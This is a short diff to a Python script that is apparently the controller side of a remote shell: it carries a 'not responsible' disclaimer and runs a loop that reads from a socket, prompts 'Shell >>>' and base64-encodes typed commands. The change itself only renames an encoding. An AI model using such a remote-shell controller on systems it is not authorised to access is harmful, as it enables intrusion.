@@ -7,6 +7,7 @@
 # I am not responsible for anything you do with it.
 # ----------------------------------------------------
 
+
 # Imports
 import base64
 import socket
@@ -61,7 +62,7 @@ def main():
 
     while True:
         data = connection.recv(CHUNKS)
-        str_data = data.decode('windows-1252')
+        str_data = data.decode('cp1252')
         print(str_data)
         command = input('Shell >>> ').lower()
         output = _base64_encode(command.encode())
